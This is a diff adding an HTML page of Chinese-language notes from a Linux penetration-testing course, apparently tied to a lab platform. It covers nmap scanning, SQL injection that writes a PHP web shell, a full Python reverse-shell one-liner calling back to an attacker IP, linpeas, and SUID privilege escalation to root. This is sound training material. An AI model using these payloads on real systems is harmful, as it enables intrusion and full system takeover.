@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux 滲透測試 D2 筆記</title>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif, '微軟正黑體'; line-height: 1.6; color: #333; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
+        .container { max-width: 1000px; margin: 0 auto; background: white; border-radius: 15px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); overflow: hidden; }
+        header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px 20px; text-align: center; }
+        header h1 { font-size: 2em; margin-bottom: 10px; }
+        .content { padding: 30px 20px; }
+        .section-title { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px 20px; border-radius: 8px; margin: 30px 0 20px 0; font-size: 1.4em; }
+        .subsection { margin-bottom: 25px; background: #f9f9f9; padding: 20px; border-radius: 8px; border-left: 4px solid #667eea; }
+        .subsection h4 { color: #667eea; margin-bottom: 15px; }
+        .command-box { background: #2d2d2d; color: #00ff00; padding: 15px; border-radius: 6px; font-family: monospace; overflow-x: auto; margin: 15px 0; font-size: 0.9em; }
+        .feature-list { display: grid; gap: 10px; margin: 15px 0; }
+        .feature-item { display: flex; gap: 12px; padding: 12px; background: white; border-radius: 6px; border: 1px solid #e0e0e0; }
+        .feature-icon { font-size: 1.5em; min-width: 30px; }
+        .feature-text strong { color: #667eea; display: block; margin-bottom: 5px; }
+        .tip-box, .warning-box, .danger-box, .key-point { padding: 15px; margin: 15px 0; border-radius: 6px; border-left: 5px solid; }
+        .tip-box { background: #e8f5e9; border-left-color: #4caf50; }
+        .warning-box { background: #fff3e0; border-left-color: #ff9800; }
+        .danger-box { background: #ffebee; border-left-color: #f44336; }
+        .key-point { background: #f3e5f5; border-left-color: #9c27b0; }
+        .diagram-container { background: white; padding: 20px; border-radius: 8px; margin: 20px 0; border: 2px solid #e0e0e0; overflow-x: auto; }
+        .comparison-table { width: 100%; border-collapse: collapse; margin: 20px 0; box-shadow: 0 2px 8px rgba(0,0,0,0.1); border-radius: 8px; overflow: hidden; }
+        .comparison-table th { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px; text-align: left; }
+        .comparison-table td { padding: 15px; border-bottom: 1px solid #e0e0e0; }
+        .comparison-table tr:nth-child(even) { background: #f9f9f9; }
+        .comparison-table tr:hover { background: #f0f4ff; }
+        .attack-flow { background: linear-gradient(to right, #fff5e6, #ffe6f0, #e6f3ff); padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 5px solid #ff9800; }
+        .step { display: flex; align-items: center; margin: 12px 0; font-weight: 500; }
+        .step-number { background: #ff9800; color: white; width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; flex-shrink: 0; }
+        .course-info { background: #f0f4ff; border-left: 5px solid #667eea; padding: 20px; margin-bottom: 30px; border-radius: 8px; }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .info-item { padding: 10px; background: white; border-radius: 6px; border-left: 3px solid #764ba2; }
+        .info-item label { font-weight: bold; color: #764ba2; display: block; margin-bottom: 5px; }
+        .info-item a { color: #667eea; text-decoration: none; }
+        footer { background: #f5f5f5; padding: 20px; text-align: center; color: #666; border-top: 1px solid #ddd; }
+        @media (max-width: 768px) { header h1 { font-size: 1.5em; } .info-grid { grid-template-columns: 1fr; } .section-title { font-size: 1.2em; } }
+        @media (max-width: 480px) { body { padding: 10px; } header { padding: 20px 15px; } .content { padding: 15px; } .command-box { font-size: 0.8em; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔐 Linux 滲透測試訓練營 D2</h1>
+            <p>Web Shell & Reverse Shell 實戰筆記</p>
+        </header>
+        
+        <div class="content">
+            <!-- IP 配置表 -->
+            <div class="course-info">
+                <h3>⚙️ IP 配置參考（請根據實際環境替換）</h3>
+                <table class="comparison-table" style="font-size: 0.95em;">
+                    <tr>
+                        <th>角色</th>
+                        <th>說明</th>
+                        <th>範例</th>
+                        <th>用途</th>
+                    </tr>
+                    <tr>
+                        <td><code>&lt;ATTACKER_IP&gt;</code></td>
+                        <td>你的 KALI 機器</td>
+                        <td>172.30.0.11</td>
+                        <td>Reverse Shell 監聽與連線來源</td>
+                    </tr>
+                    <tr>
+                        <td><code>&lt;TARGET_IP&gt;</code></td>
+                        <td>目標靶機</td>
+                        <td>172.30.0.10</td>
+                        <td>掃描 & 攻擊目標</td>
+                    </tr>
+                    <tr>
+                        <td><code>&lt;JUMPBOX_HOST&gt;</code></td>
+                        <td>中繼跳躍伺服器</td>
+                        <td>dockerlab.feifei.tw</td>
+                        <td>SSH 通訊埠轉發中介</td>
+                    </tr>
+                    <tr>
+                        <td><code>&lt;JUMPBOX_PORT&gt;</code></td>
+                        <td>Jumpbox SSH 埠</td>
+                        <td>32922</td>
+                        <td>連線到跳躍伺服器</td>
+                    </tr>
+                    <tr>
+                        <td><code>&lt;LOCAL_PORT&gt;</code></td>
+                        <td>本地轉發埠</td>
+                        <td>5555</td>
+                        <td>瀏覽器訪問轉發後的目標</td>
+                    </tr>
+                    <tr>
+                        <td><code>&lt;LISTEN_PORT&gt;</code></td>
+                        <td>Reverse Shell 監聽埠</td>
+                        <td>4444</td>
+                        <td>靶機連回的目標埠號</td>
+                    </tr>
+                </table>
+            </div>
+
+            <!-- 課程資訊 -->
+            <div class="course-info">
+                <h3>📌 課程基本資訊</h3>
+                <div class="info-grid">
+                    <div class="info-item">
+                        <label>📅 日期</label>
+                        2025-12-08
+                    </div>
+                    <div class="info-item">
+                        <label>⏰ 時間</label>
+                        20:00 - 22:00
+                    </div>
+                    <div class="info-item">
+                        <label>🔗 直播</label>
+                        <a href="https://meet.google.com/egk-qpvc-bcm" target="_blank">Google Meet</a>
+                    </div>
+                    <div class="info-item">
+                        <label>📝 共筆</label>
+                        <a href="https://hackmd.io/@kiwissec/20251208-Linux3-D2/edit" target="_blank">HackMD</a>
+                    </div>
+                    <div class="info-item">
+                        <label>🎮 靶機平台</label>
+                        <a href="https://dockerlab.feifei.tw/" target="_blank">dockerlab</a>
+                    </div>
+                    <div class="info-item">
+                        <label>🔑 註冊碼</label>
+                        Linux202503
+                    </div>
+                </div>
+            </div>
+
+            <!-- 概觀 -->
+            <div class="section-title">🎯 課程攻擊流程圖</div>
+            <div class="diagram-container">
+                <div class="mermaid">
+                    graph LR
+                        A["🌐 掃描<br/>nmap/dirb"] --> B["🔍 發現<br/>SQLi漏洞"]
+                        B --> C["💾 寫入<br/>Web Shell"]
+                        C --> D["📞 建立<br/>Reverse Shell"]
+                        D --> E["👑 尋找<br/>SUID漏洞"]
+                        E --> F["🏆 Root<br/>權限"]
+                        style A fill:#e1f5ff
+                        style B fill:#fff3e0
+                        style C fill:#f3e5f5
+                        style D fill:#e8f5e9
+                        style E fill:#fce4ec
+                        style F fill:#c8e6c9
+                </div>
+            </div>
+
+            <!-- 第一部分 -->
+            <div class="section-title">🌐 第一部分：Web 服務掃描與代理設定</div>
+            
+            <div class="subsection">
+                <h4>📍 Nmap 掃描</h4>
+                <div class="command-box">$ nmap &lt;TARGET_IP&gt;</div>
+                <p>基礎掃描開放連接埠</p>
+                
+                <div class="command-box">$ nmap -sC -sV &lt;TARGET_IP&gt;</div>
+                <p>-sC: NSE 腳本 | -sV: 版本偵測</p>
+                
+                <div class="command-box">$ nmap --script=http-* -p 80 &lt;TARGET_IP&gt;</div>
+                <p>掃描 HTTP 相關漏洞（較慢但完整）</p>
+            </div>
+
+            <div class="subsection">
+                <h4>🔍 目錄掃描 - dirb</h4>
+                <div class="command-box">$ apt update && apt install dirb</div>
+                <div class="command-box">$ dirb http://&lt;TARGET_IP&gt;</div>
+                <div class="command-box">$ curl http://&lt;TARGET_IP&gt;/index.php</div>
+                <p>確認找到的頁面存在性</p>
+            </div>
+
+            <div class="subsection">
+                <h4>🔐 SSH 通訊埠轉發</h4>
+                <div class="command-box">$ ssh -L &lt;LOCAL_PORT&gt;:&lt;TARGET_IP&gt;:80 root@&lt;JUMPBOX_HOST&gt; -p &lt;JUMPBOX_PORT&gt;</div>
+                <p>本地 &lt;LOCAL_PORT&gt; → 靶機 &lt;TARGET_IP&gt;:80 （訪問 http://localhost:&lt;LOCAL_PORT&gt;）</p>
+                
+                <div class="diagram-container">
+                    <div class="mermaid">
+                        graph LR
+                            A["🖥️ 本地<br/>172.30.0.11"] -->|加密SSH隧道| B["🔄 Jumpbox<br/>dockerlab"]
+                            B -->|內部訪問| C["🎯 靶機<br/>172.30.0.10"]
+                            D["瀏覽器"] -->|localhost:5555| A
+                            A -.->|轉發| C
+                            style A fill:#e1f5ff
+                            style B fill:#fff3e0
+                            style C fill:#ffe0b2
+                            style D fill:#f3e5f5
+                    </div>
+                </div>
+            </div>
+
+            <!-- 第二部分 -->
+            <div class="section-title">💾 第二部分：SQL 注入與 Web Shell</div>
+            
+            <div class="subsection">
+                <h4>🔍 SQL 注入測試步驟</h4>
+                <div class="feature-list">
+                    <div class="feature-item">
+                        <div class="feature-icon">1️⃣</div>
+                        <div class="feature-text">
+                            <strong>測試欄位數量</strong>
+                            <code>1 order by 1</code> → <code>...by 5</code> → <code>...by 6(失敗)</code><br/>
+                            結論：5 個欄位
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">2️⃣</div>
+                        <div class="feature-text">
+                            <strong>Union 注入</strong>
+                            <code>0 union select null,null,null,null,null</code><br/>
+                            識別欄位是否在頁面回顯
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">3️⃣</div>
+                        <div class="feature-text">
+                            <strong>數據回顯測試</strong>
+                            <code>0 union SELECT 1,2,3,4,5</code><br/>
+                            確定可用的回顯位置（通常第4個）
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="subsection">
+                <h4>📝 Web Shell 植入</h4>
+                <div class="command-box">$ 0 union SELECT 1,2,3,4,5 INTO OUTFILE '/var/www/html/test.txt'</div>
+                <p>測試寫檔能力</p>
+                
+                <div class="command-box">$ 0 union SELECT NULL,NULL,NULL,"&lt;?php system($_GET['cmd']); ?&gt;",NULL INTO OUTFILE '/var/www/html/shell.php'</div>
+                <p>植入 Web Shell（注意第4個欄位放 PHP 代碼）</p>
+                
+                <div class="command-box">$ http://localhost:5555/shell.php?cmd=ls</div>
+                <p>透過瀏覽器執行遠端命令</p>
+                
+                <div class="diagram-container">
+                    <div class="mermaid">
+                        graph TD
+                            A["🖥️ 攻擊者"] -->|SQL注入| B["🗄️ MySQL"]
+                            B -->|INTO OUTFILE| C["📄 Web Shell<br/>shell.php"]
+                            A -->|GET ?cmd=ls| D["🌐 Apache"]
+                            D -->|執行| C
+                            C -->|系統命令| E["⚙️ 作業系統"]
+                            E -->|回傳| D
+                            D -->|回應| A
+                            style A fill:#e1f5ff
+                            style B fill:#fff3e0
+                            style C fill:#f3e5f5
+                            style D fill:#fce4ec
+                            style E fill:#c8e6c9
+                    </div>
+                </div>
+                
+                <div class="danger-box">
+                    <strong>⚠️ 防禦：</strong> 別給 MySQL 用戶 INTO OUTFILE 權限！遵循最小權限原則
+                </div>
+            </div>
+
+            <!-- 第三部分 -->
+            <div class="section-title">📞 第三部分：Reverse Shell 實戰</div>
+            
+            <div class="subsection">
+                <h4>🎯 Reverse Shell vs Web Shell</h4>
+                <table class="comparison-table">
+                    <tr>
+                        <th>特性</th>
+                        <th>Web Shell（被動）</th>
+                        <th>Reverse Shell（主動）</th>
+                    </tr>
+                    <tr>
+                        <td><strong>連線方向</strong></td>
+                        <td>攻擊者 → 靶機</td>
+                        <td>靶機 → 攻擊者</td>
+                    </tr>
+                    <tr>
+                        <td><strong>交互方式</strong></td>
+                        <td>逐次發送 HTTP 請求</td>
+                        <td>持續 TCP 連線，即時互動</td>
+                    </tr>
+                    <tr>
+                        <td><strong>防火牆</strong></td>
+                        <td>可能被入站規則阻擋</td>
+                        <td>繞過入站限制（靶機主動連出）</td>
+                    </tr>
+                    <tr>
+                        <td><strong>穩定性</strong></td>
+                        <td>每次操作需重新請求</td>
+                        <td>連線持久、操作流暢</td>
+                    </tr>
+                    <tr>
+                        <td><strong>用途</strong></td>
+                        <td>一次性命令執行</td>
+                        <td>深入滲透、提權操作</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="subsection">
+                <h4>📞 建立 Reverse Shell</h4>
+                
+                <p><strong>步驟 1: 攻擊者設置監聽</strong></p>
+                <div class="command-box">$ nc -lvnp 4444</div>
+                <p>-l: 監聽模式 | -v: 詳細輸出 | -n: 數字 IP | -p: 埠號</p>
+                
+                <p><strong>步驟 2: 使用 revshells.com 生成 payload</strong></p>
+                <div class="command-box">訪問 https://www.revshells.com/
+選擇 Python3
+填入攻擊者 IP: 172.30.0.11
+填入監聽埠: 4444</div>
+                
+                <p><strong>步驟 3: 透過 Web Shell 執行 payload</strong></p>
+                <div class="command-box">$ http://localhost:5555/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.30.0.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</div>
+                
+                <p><strong>步驟 4: 升級 Shell 穩定性</strong></p>
+                <div class="command-box">$ python3 -c 'import pty;pty.spawn("/bin/bash")'</div>
+                <p>使用 PTY 提高互動性與穩定性</p>
+                
+                <p><strong>步驟 5: 驗證 Shell 環境</strong></p>
+                <div class="command-box">$ echo $PS1</div>
+                <p>查看 Shell 提示符設置，確認已升級為 bash</p>
+                
+                <div class="diagram-container">
+                    <div class="mermaid">
+                        graph TD
+                            A["🖥️ 攻擊者"] -->|nc -lvnp 4444<br/>監聽| B["🔌 監聽端口<br/>4444"]
+                            C["🎯 靶機"] -->|觸發 Reverse Shell| D["Web Shell"]
+                            D -->|python3 反彈| B
+                            B -->|TCP 連線建立| C
+                            C -->|主動回呼<br/>Connect to<br/>172.30.0.11:4444| A
+                            A -->|互動 Shell| C
+                            style A fill:#e1f5ff
+                            style B fill:#fff3e0
+                            style C fill:#f3e5f5
+                            style D fill:#fce4ec
+                    </div>
+                </div>
+            </div>
+
+            <div class="subsection">
+                <h4>📥 下載掃描工具 - linpeas</h4>
+                <div class="command-box">$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh</div>
+                <div class="command-box">$ chmod +x linpeas.sh</div>
+                <div class="command-box">$ ./linpeas.sh > l.txt</div>
+                <p>執行並將結果保存到檔案</p>
+                
+                <div class="command-box">$ cat l.txt</div>
+                <p>查看掃描結果，尋找提權機會</p>
+            </div>
+
+            <!-- 第四部分 -->
+            <div class="section-title">👑 第四部分：Linux 權限提升（SUID/SGID）</div>
+            
+            <div class="subsection">
+                <h4>🔍 尋找 SUID 檔案</h4>
+                <div class="command-box">$ find / -perm -u=s -type f 2>/dev/null</div>
+                <p>
+                    <strong>參數解析：</strong><br/>
+                    find / → 從根目錄開始搜尋<br/>
+                    -perm -u=s → 找 SUID 位元的檔案<br/>
+                    -type f → 只搜尋普通檔案<br/>
+                    2>/dev/null → 隱藏錯誤訊息
+                </p>
+                
+                <div class="command-box">$ ls -al /usr/local/bin/bash_suid</div>
+                <p>檢查可疑 SUID 程式的詳細資訊</p>
+            </div>
+
+            <div class="subsection">
+                <h4>🔐 SUID/SGID 原理</h4>
+                <div class="diagram-container">
+                    <div class="mermaid">
+                        graph TD
+                            A["普通使用者<br/>執行 SUID 程式"] -->|執行時獲得| B["程式擁有者權限<br/>（通常是 Root）"]
+                            B -->|臨時提升| C["進程以 Root 權限執行"]
+                            C -->|程式結束後| D["回到普通使用者權限"]
+                            
+                            E["SUID<br/>-rwsr-xr-x"] -->|owner 位元| F["u=s"]
+                            G["SGID<br/>-rwxr-sr-x"] -->|group 位元| H["g=s"]
+                            
+                            style B fill:#f3e5f5
+                            style C fill:#ffcdd2
+                            style F fill:#fff3e0
+                            style H fill:#c8e6c9
+                    </div>
+                </div>
+                
+                <div class="feature-list">
+                    <div class="feature-item">
+                        <div class="feature-icon">👑</div>
+                        <div class="feature-text">
+                            <strong>SUID (Set User ID)</strong><br/>
+                            執行時暫時獲得擁有者（通常是 root）的權限
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">👥</div>
+                        <div class="feature-text">
+                            <strong>SGID (Set Group ID)</strong><br/>
+                            執行時暫時獲得群組權限
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="subsection">
+                <h4>⚙️ 利用 GTFOBins 進行提權</h4>
+                <p><strong>訪問 GTFOBins 資料庫：</strong></p>
+                <div class="command-box">$ https://gtfobins.github.io/
+搜尋: bash_suid
+https://gtfobins.github.io/gtfobins/bash/#suid</div>
+                
+                <p><strong>執行提權命令：</strong></p>
+                <div class="command-box">$ /usr/local/bin/bash_suid -p</div>
+                <p>-p 選項在 bash 中保持提升的權限</p>
+                
+                <p><strong>驗證提權成功：</strong></p>
+                <div class="command-box">$ whoami
+root
+
+$ cat /root/root.txt
+KIWISSEC{...flag...}</div>
+                
+                <div class="key-point">
+                    <strong>💡 GTFOBins 是什麼？</strong><br/>
+                    GTFOBins 是一個資料庫，記錄了常見 Unix 程式可被濫用進行提權的方法。對每個發現的 SUID 程式，都應該在 GTFOBins 上搜尋利用方式。
+                </div>
+            </div>
+
+            <!-- 完整流程 -->
+            <div class="section-title">⚔️ 完整攻擊流程</div>
+            <div class="attack-flow">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-text"><strong>掃描</strong> - nmap 識別開放服務</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-text"><strong>探測</strong> - dirb 掃描目錄，發現 Web 應用</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-text"><strong>注入</strong> - 測試 SQL 注入漏洞</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <div class="step-text"><strong>植入</strong> - 透過 SQLi 寫入 Web Shell</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">5</div>
+                    <div class="step-text"><strong>反彈</strong> - Web Shell 觸發 Reverse Shell</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">6</div>
+                    <div class="step-text"><strong>升級</strong> - Python PTY 穩定互動式 Shell</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">7</div>
+                    <div class="step-text"><strong>掃描</strong> - linpeas 尋找提權漏洞</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">8</div>
+                    <div class="step-text"><strong>提權</strong> - 利用 SUID + GTFOBins 獲得 Root</div>
+                </div>
+            </div>
+
+            <!-- 工具速查 -->
+            <div class="section-title">🛠️ 實用工具速查表</div>
+            <table class="comparison-table">
+                <tr>
+                    <th>工具</th>
+                    <th>用途</th>
+                    <th>常用命令</th>
+                </tr>
+                <tr>
+                    <td><strong>nmap</strong></td>
+                    <td>埠掃描與版本偵測</td>
+                    <td><code>nmap -sC -sV 目標IP</code></td>
+                </tr>
+                <tr>
+                    <td><strong>dirb</strong></td>
+                    <td>Web 目錄掃描</td>
+                    <td><code>dirb http://目標 字典檔</code></td>
+                </tr>
+                <tr>
+                    <td><strong>sqlmap</strong></td>
+                    <td>SQL 注入自動化</td>
+                    <td><code>sqlmap -u "URL" --dbs</code></td>
+                </tr>
+                <tr>
+                    <td><strong>nc (netcat)</strong></td>
+                    <td>監聽 & 連線</td>
+                    <td><code>nc -lvnp 埠號</code></td>
+                </tr>
+                <tr>
+                    <td><strong>linpeas.sh</strong></td>
+                    <td>權限提升掃描</td>
+                    <td><code>./linpeas.sh > 輸出.txt</code></td>
+                </tr>
+                <tr>
+                    <td><strong>GTFOBins</strong></td>
+                    <td>提權漏洞資料庫</td>
+                    <td><code>https://gtfobins.github.io/</code></td>
+                </tr>
+            </table>
+
+            <div class="key-point">
+                <strong>📚 學習建議：</strong><br/>
+                1️⃣ 第一次上課時跟著老師動手實作，不要只聽<br/>
+                2️⃣ 自己記錄每個步驟，理解原理而非死背命令<br/>
+                3️⃣ 多次實踐（至少 3 次）才能真正掌握<br/>
+                4️⃣ 參考官方文件（man pages、GitHub）加深理解<br/>
+                5️⃣ 在 Vulnhub 或 HackTheBox 上自行練習
+            </div>
+        </div>
+
+        <footer>
+            <p>📚 Linux 滲透測試訓練營 D2 筆記 | 飛飛資安 | 2025</p>
+            <p>本筆記適合已參加課程或自學者複習使用</p>
+        </footer>
+    </div>
+
+    <script>
+        mermaid.contentLoaded();
+    </script>
+</body>
+</html>
